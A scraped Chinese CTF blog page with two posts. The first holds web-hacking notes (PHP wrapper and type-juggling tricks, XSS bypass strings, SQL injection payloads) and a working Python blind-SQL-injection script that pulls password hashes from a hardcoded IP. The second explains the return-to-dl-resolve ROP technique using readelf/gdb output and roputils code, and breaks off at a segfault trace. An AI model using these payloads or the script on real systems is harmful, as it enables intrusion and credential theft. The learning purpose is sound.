<p>trim去掉空格 除了0xf</p>
<p>parse_str()解析字符串为变量</p>
<p>== 类型不一定等 ===类型也要等</p>
<p>sha1加密失败返回NULL</p>
<p>switch没有break</p>
<p>array转换int 0或者1 </p>
<p>0e科学计数法</p>
<p>ox 或者0x开头字符串等于16进制</p>
<p>%00截断</p>
<p>两个number可以绕过后一个</p>
<p>php伪协议</p>
<p>a=data:text/plain,&lt;?php&gt;</p>
<p>php://input enctype=”multipart/from-data”无效</p>
<p>php://filter/read=string.tolower/resource=test.php</p>
<p>include_once(“flag.php”);</p>
<p>反序列化</p>
<p>session反序列化 上传名字为序列化的文件</p>
<p>hackbar</p>
<p>xss </p>
<p>绕过</p>
<p>“data:text/javascript，alert(3);”</p>
<p>us-ascii</p>
<p>utf-7</p>
<p>multi-byte gbl</p>
<p>宽字节</p>
<p>%3c%27 alert(1) //</p>
<p>反序列化</p>
<p>session反序列化可以先创建个文件在远程</p>
<pre><code>                                  table_scnema

column                     table_name

                              column_name
</code></pre><p>desc   information_schema  {                         schemata                   schem_name</p>
<pre><code>tables                table_schema

                        table_name     
</code></pre><p>?id=1’ and ord(mid(‘select table_name   from information_schema.tables limit 1,1’,1,1))&gt;11%23</p>
<p>import requests</p>
<p>import base64</p>
<p>import time</p>
<p>import string</p>
<p>print ‘a’</p>
<p>def send(url,key1,value1):</p>
<pre><code>value1 = base64.b64encode(value1)


data = {


    key1:value1,


}


response = requests.post(url,data=data)


content = response.content





if &quot;Alix&quot; in content:


    return True


else:


    return False
</code></pre><p>str = string.printable</p>
<p>def main():</p>
<pre><code>found = &quot;&quot;


for i in range(1, 80):





    for j in range(1, 123):






        _username = &quot;nothing&apos; or ascii(mid((select group_concat(password) from users), %d, 1))=%d#&quot; % (i, j)






        _password=&quot;amin&quot;


        print _username


        if send(&apos;http://128.199.224.175:24000/&apos;, &apos;spy_name&apos;,_username):


            found +=chr(j)


            print found


            break
</code></pre><p>main()</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/rtd/">return to dl-resolve</a></h1>
  

    </header>
    <div class="entry">
      
        <p>我们都知道，ELF在执行时，许多函数的地址是lazy binding的，即在第一次调用时才会解析其地址并填充至.got.plt。对于具体这一解析过程是如何完成的，之前并不怎么了解，只知道是在.plt中完成。其实之前Tiger有告诉我有一个名为roputils的工具，利用的就是构造所需信息，直接解析得到system的地址进而ROP。但直到最近才去研究其代码，搞明白这一技术，即return to dl-resolve，具体是怎么回事。</p>
<p>关于这一技术，在phrack的某一期有具体介绍。在此，我们首先以32位为例，阐述其基本原理；之后则会分析64位环境下这一技术的一些注意点。</p>
<p>32位环境下return to dl-resolve<br>ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。其内容示例如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d bof32</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x614 contains 24 entries:</span><br><span class="line">Tag        Type                         Name/Value</span><br><span class="line">0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line">0x0000000c (INIT)                       0x80482b0</span><br><span class="line">0x0000000d (FINI)                       0x80484f4</span><br><span class="line">0x00000019 (INIT_ARRAY)                 0x8049608</span><br><span class="line">0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x0000001a (FINI_ARRAY)                 0x804960c</span><br><span class="line">0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x6ffffef5 (GNU_HASH)                   0x804818c</span><br><span class="line">0x00000005 (STRTAB)                     0x804820c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481ac</span><br><span class="line">0x0000000a (STRSZ)                      80 (bytes) 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line">0x00000015 (DEBUG)                      0x0</span><br><span class="line">0x00000003 (PLTGOT)                     0x8049700</span><br><span class="line">0x00000002 (PLTRELSZ)                   32 (bytes)</span><br><span class="line">0x00000014 (PLTREL)                     REL</span><br><span class="line">0x00000017 (JMPREL)                     0x8048290</span><br><span class="line">0x00000011 (REL)                        0x8048288</span><br><span class="line">0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line">0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line">0x6ffffffe (VERNEED)                    0x8048268</span><br><span class="line">0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line">0x6ffffff0 (VERSYM)                     0x804825c</span><br><span class="line">0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></p>
<p>其中的JMPREL segment，对应于.rel.plt section，是用来保存运行时重定位表的。它与.rel.dyn类似，只不过.rel.plt是用于函数重定位，.rel.dyn是用于变量重定位。具体地，其内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r bof32</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.dyn&apos; at offset 0x288 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">080496fc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.plt&apos; at offset 0x290 contains 4 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804970c  00000107 R_386_JUMP_SLOT   00000000   read</span><br><span class="line">08049710  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">08049714  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main</span><br><span class="line">08049718  00000407 R_386_JUMP_SLOT   00000000   write</span><br></pre></td></tr></table></figure></p>
<p>可以看到，.rel.plt里包含4个条目。事实上，之前.dynamic section中的PLTRELSZ即为.rel.plt的总大小，32 bytes；PLTREL则指明这些条目的类型为REL；RELENT指明了每个REL类型条目的大小，8 bytes。于是32/8=4即为条目个数。</p>
<p>这些条目的类型是Elf32_Rel，其定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef uint32_t Elf32_Addr;</span><br><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Addr    r_offset;               /* Address */</span><br><span class="line">Elf32_Word    r_info;                 /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</span><br><span class="line">#define ELF32_R_TYPE(val) ((val) &amp; 0xff)</span><br></pre></td></tr></table></figure></p>
<p>我们以.rel.plt第一条，即read的条目为例，对比调试器显示的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/2x 0x8048290</span><br><span class="line">0x8048290:      0x0804970c      0x00000107</span><br></pre></td></tr></table></figure></p>
<p>显示的结果与之前$ readelf -r的结果是相符的。具体地，r_offset即为该函数在.got.plt中的地址:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br></pre></td></tr></table></figure></p>
<p>而r_info则保存的是其类型和符号序号。根据宏的定义，可知对于此条目，其类型为ELF32_R_TYPE(r_info)=7，对应于R_386_JUMP_SLOT；其symbol index则为RLF32_R_SYM(r_info)=1。</p>
<p>注意到之前$ readelf -r所得到的结果中，包含有Sym.Value和Sym. Name信息。而这些信息就是通过symbol index找到的。具体地，.dynamic section中的SYMTAB，即.dynsym section，保存的便是相关的符号信息。每一条symbol信息的大小在SYMENT中体现，为16 bytes。通过$ readelf -s来查看其内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s bof32</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.dynsym&apos; contains 6 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)</span><br><span class="line">     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br><span class="line">     5: 0804850c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.symtab&apos; contains 74 entries:</span><br></pre></td></tr></table></figure></p>
<p>(注意我们这里只看.dynsym，因为它是运行时所需的。诸如export/import的符号信息全在这里。而.symtab是编译时的符号信息，这部分在strip之后会被删除掉。)</p>
<p>可以看到，之前所说的read函数的符号信息条目index确实为1。我们通过调试器来看看其实际内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/4x 0x80481ac+16</span><br><span class="line">0x80481bc:      0x0000001a      0x00000000      0x00000000      0x00000012</span><br></pre></td></tr></table></figure></p>
<p>对比符号条目的定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Word    st_name;   /* Symbol name (string tbl index) */</span><br><span class="line">Elf32_Addr    st_value;  /* Symbol value */</span><br><span class="line">Elf32_Word    st_size;   /* Symbol size */</span><br><span class="line">unsigned char st_info;   /* Symbol type and binding */</span><br><span class="line">unsigned char st_other;  /* Symbol visibility under glibc&gt;=2.2 */</span><br><span class="line">Elf32_Section st_shndx;  /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p>
<p>其结果与$ readelf -r, $ readelf -s的结果相符。具体地，st_name保存的是该符号名称在STRTAB，即.dynstr中的地址：</p>
<p>gdb-peda$ x/s 0x804820c+0x1a<br>0x8048226:      “read”<br>而对于其他项，如st_info，st_other等，我还没搞明白对应的意义。但在实际构造时，只需选择和其他相同的值应该即可。</p>
<p>OK，以上便是相关背景知识。现在我们来看看在call read@plt时具体发生了什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure></p>
<p>在第一次调用时，jmp <a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>会跳回read@plt，这是我们已经知道的。接下来，会将参数push到栈上并跳至.got.plt+0x8，这相当于调用以下函数：</p>
<p>_dl_runtime_resolve(link_map, rel_offset);<br>_dl_runtime_resolve则会完成具体的符号解析，填充结果，和调用的工作。具体地。根据rel_offset，找到重定位条目：</p>
<p>Elf32_Rel * rel_entry = JMPREL + rel_offset;<br>根据rel_entry中的符号表条目编号，得到对应的符号信息：</p>
<p>Elf32_Sym <em>sym_entry = SYMTAB[ELF32_R_SYM(rel_entry-&gt;r_info)];<br>再找到符号信息中的符号名称：<br>char </em>sym_name = STRTAB + sym_entry-&gt;st_name;<br>由此名称，搜索动态库。找到地址后，填充至.got.plt对应位置。最后调整栈，调用这一解析得到的函数。<br>于是，我们的思路是，提供一个很大的数作为rel_offset给_dl_runtime_resolve，使得找到rel_entry落在我们可控制的区域内。同理，构造伪条目，使得所对应的符号信息、符号的名称，均落在我们可控的区域内，那么就可以解析我们所需的函数地址并调用了。值得注意的是，在解析过程中，还会对ELF32_R_TYPE(rel_entry-&gt;r_info)等进行检查。但这些数据我们只需仿照正常的来构造即可，重点是对应的伪条目的index应计算正确。<br>作为实例，我们来看看roputils里是如何构造伪条目的。首先是函数dl_resolve_data。其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    def dl_resolve_data(self, base, name):</span><br><span class="line">jmprel = self.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">relent = self.dynamic(&apos;RELENT&apos;)</span><br><span class="line">symtab = self.dynamic(&apos;SYMTAB&apos;)</span><br><span class="line">syment = self.dynamic(&apos;SYMENT&apos;)</span><br><span class="line">strtab = self.dynamic(&apos;STRTAB&apos;)</span><br><span class="line"></span><br><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)</span><br><span class="line">addr_symstr = addr_sym + syment</span><br><span class="line"></span><br><span class="line">r_info = (((addr_sym - symtab) / syment) &lt;&lt; 8) | 0x7</span><br><span class="line">st_name = addr_symstr - strtab</span><br><span class="line"></span><br><span class="line">buf = self.fill(padlen_reloc)</span><br><span class="line">buf += struct.pack(&apos;&lt;II&apos;, base, r_info)                      # Elf32_Rel</span><br><span class="line">buf += self.fill(padlen_sym)</span><br><span class="line">buf += struct.pack(&apos;&lt;IIII&apos;, st_name, 0, 0, 0x12)             # Elf32_Sym</span><br><span class="line">buf += self.string(name)</span><br><span class="line"></span><br><span class="line">return buf</span><br></pre></td></tr></table></figure></p>
<p>从base开始便是用户可控的区域，也是用来构造伪Elf32_Rel, 伪Elf32_Sym，和符号名称的地方。具体的存放地址，还是根据数组条目的大小进行了对齐。而需要检查的地方，则全部硬编码了，只需计算这些伪条目对应在数组中的index填充即可。</p>
<p>其次便是函数dl_resolve_call了。其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    def dl_resolve_call(self, base, *args):</span><br><span class="line">jmprel = self.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">relent = self.dynamic(&apos;RELENT&apos;)</span><br><span class="line"></span><br><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">reloc_offset = addr_reloc - jmprel</span><br><span class="line"></span><br><span class="line">buf = self.p(self.plt())</span><br><span class="line">buf += self.p(reloc_offset)</span><br><span class="line">buf += self.p(self.gadget(&apos;pop&apos;, n=len(args)))</span><br><span class="line">buf += self.p(args)</span><br><span class="line"></span><br><span class="line">return buf</span><br></pre></td></tr></table></figure></p>
<p>可以看到，这里将所调用的函数的参数及返回的gadget放在栈上，再往上便是构造的伪Elf32_Rel条目的offset，最后则是.plt起始处的地址，在那里会完成将link_map放至栈上及调用_dl_runtime_resolve。</p>
<p>64位环境下return to dl-resolve<br>相比32位，其实基本原理还是相同的。只是由于位数增加，一些结构体发生变化；此外，函数参数也变成由寄存器传递而非栈传递。</p>
<p>具体地，我们看64位relocation entry的定义。首先通过$ readelf -d可知，现在的类型为RELA，大小RELAENT为24 bytes：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d bof64</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x7b0 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x000000000000000c (INIT)               0x4003e0</span><br><span class="line"> 0x000000000000000d (FINI)               0x400634</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x600798</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x6007a0</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x400260</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x4002f8</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x400280</span><br><span class="line"> 0x000000000000000a (STRSZ)              67 (bytes)</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x600988</span><br><span class="line"> 0x0000000000000002 (PLTRELSZ)           96 (bytes)</span><br><span class="line"> 0x0000000000000014 (PLTREL)             RELA</span><br><span class="line"> 0x0000000000000017 (JMPREL)             0x400380</span><br><span class="line"> 0x0000000000000007 (RELA)               0x400368</span><br><span class="line"> 0x0000000000000008 (RELASZ)             24 (bytes)</span><br><span class="line"> 0x0000000000000009 (RELAENT)            24 (bytes)</span><br><span class="line"> 0x000000006ffffffe (VERNEED)            0x400348</span><br><span class="line"> 0x000000006fffffff (VERNEEDNUM)         1</span><br><span class="line"> 0x000000006ffffff0 (VERSYM)             0x40033c</span><br><span class="line"> 0x0000000000000000 (NULL)               0x0</span><br></pre></td></tr></table></figure></p>
<p>其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef __u16   Elf64_Half;</span><br><span class="line">typedef __u32   Elf64_Word;</span><br><span class="line">typedef __u64   Elf64_Addr;</span><br><span class="line">typedef __u64   Elf64_Xword;</span><br><span class="line">typedef __s64   Elf64_Sxword;</span><br><span class="line"></span><br><span class="line">typedef struct elf64_rela &#123;</span><br><span class="line">Elf64_Addr r_offset;  /* Location at which to apply the action */</span><br><span class="line">Elf64_Xword r_info;   /* index and type of relocation */</span><br><span class="line">Elf64_Sxword r_addend;    /* Constant addend used to compute value */</span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line">#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span><br><span class="line">#define ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span><br></pre></td></tr></table></figure></p>
<p>相应地，在roputils中，64位下构造伪Elf64_Rela的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r_info = (((addr_sym - symtab) / syment) &lt;&lt; 32) | 0x7</span><br><span class="line"></span><br><span class="line">buf += struct.pack(&apos;&lt;QQQ&apos;, base, r_info, 0)                  # Elf64_Rela</span><br></pre></td></tr></table></figure>
<p>SYMTAB中的条目定义则变化如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct elf64_sym &#123;</span><br><span class="line">Elf64_Word st_name;       /* Symbol name, index in string tbl */</span><br><span class="line">unsigned char st_info;    /* Type and binding attributes */</span><br><span class="line">unsigned char st_other;   /* No defined meaning, 0 */</span><br><span class="line">Elf64_Half st_shndx;      /* Associated section index */</span><br><span class="line">Elf64_Addr st_value;      /* Value of the symbol */</span><br><span class="line">Elf64_Xword st_size;      /* Associated symbol size */</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
<p>可以看到，st_info，st_other等的位置被提前了。对应于roputils中的代码则为：</p>
<pre><code>buf += struct.pack(&apos;&lt;IIQQ&apos;, st_name, 0x12, 0, 0)             # Elf64_Sym
</code></pre><p>以上便是相关结构的变更情况。接下来，我们看roputils中传递函数参数的相关代码。</p>
<p>首先，看看64位下.plt中解析函数地址的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x400420 &lt;read@plt&gt;: jmp    QWORD PTR [rip+0x200582]        # 0x6009a8 &lt;read@got.plt&gt;</span><br><span class="line">   0x400426 &lt;read@plt+6&gt;:       push   0x1</span><br><span class="line">   0x40042b &lt;read@plt+11&gt;:      jmp    0x400400</span><br><span class="line">gdb-peda$ x/2i 0x400400</span><br><span class="line">   0x400400:    push   QWORD PTR [rip+0x20058a]        # 0x600990</span><br><span class="line">   0x400406:    jmp    QWORD PTR [rip+0x20058c]        # 0x600998</span><br></pre></td></tr></table></figure>
<p>可以看到，给_dl_runtime_resolve传递的参数仍然是两个，但第二个参数已由之前32位的相对JMPREL的偏移变为该条目的在数组中的index。相应地，roputils在这里也进行了改变：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)</span><br><span class="line">reloc_offset = (addr_reloc - jmprel) / relaent</span><br><span class="line"></span><br><span class="line">buf = self.p(self.plt())</span><br><span class="line">buf += self.p(reloc_offset)</span><br></pre></td></tr></table></figure>
<p>另外，注意到给_dl_runtime_resolve传递参数的方式，依然是通过栈，而非一般情况下通过寄存器传递。这是因为此时的寄存器rdi等中已经存有要解析的函数所需的参数了。具体地，roputils中是通过某些gadget来将所需的参数，如/bin/sh的地址，保存在寄存器中。</p>
<p>然而，阅读roputils的示例代码，我们发现它还会在解析函数地址之前，将link_map+0x1c8处设为NULL。我们试着去掉这一操作，再执行发现遇到segfault了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x40033c --&gt; 0x2000200020000</span><br><span class="line">RBX: 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">RCX: 0x155dc00000007</span><br><span class="line">RDX: 0x155dc</span><br><span class="line">RSI: 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">RDI: 0x4002f8 --&gt; 0x6f732e6362696c00 (&apos;&apos;)</span><br><span class="line">RBP: 0x0</span><br><span class="line">RSP: 0x600da8 --&gt; 0x0</span><br><span class="line">RIP: 0x7ffff7de9448 (&lt;_dl_fixup+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2])</span><br><span class="line">R8 : 0x600f00 --&gt; 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">R9 : 0x7ffff7dea4e0 (&lt;_dl_fini&gt;:        push   rbp)</span><br><span class="line">R10: 0x7ffff7ffe130 --&gt; 0x0</span><br><span class="line">R11: 0x246</span><br><span class="line">R12: 0x0</span><br><span class="line">R13: 0x0</span><br><span class="line">R14: 0x0</span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7de943b &lt;_dl_fixup+107&gt;:      test rax,rax</span><br><span class="line">   0x7ffff7de943e &lt;_dl_fixup+110&gt;:      je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x7ffff7de9444 &lt;_dl_fixup+116&gt;:      mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x7ffff7de9448 &lt;_dl_fixup+120&gt;:      movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x7ffff7de944c &lt;_dl_fixup+124&gt;:      and    eax,0x7fff</span><br><span class="line">   0x7ffff7de9451 &lt;_dl_fixup+129&gt;:      lea    rdx,[rax+rax*2]</span><br><span class="line">   0x7ffff7de9455 &lt;_dl_fixup+133&gt;:      mov    rax,QWORD PTR [r10+0x2e0]</span><br><span class="line">   0x7ffff7de945c &lt;_dl_fixup+140&gt;:      lea    r8,[rax+rdx*8]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x600da8 --&gt; 0x0</span><br><span class="line">0008| 0x600db0 --&gt; 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">0016| 0x600db8 --&gt; 0x0</span><br><span class="line">0024| 0x600dc0 --&gt; 0x0</span><br><span class="line">0032| 0x600dc8 --&gt; 0x0</span><br><span class="line">0040| 0x600dd0 --&gt; 0x7ffff7defd00 (&lt;_dl_runtime_resolve+80&gt;:    mov    r11,rax)</span><br><span class="line">0048| 0x600dd8 (&quot;jweM5ZXF&quot;)</span><br><span class="line">0056| 0x600de0 --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure></p>
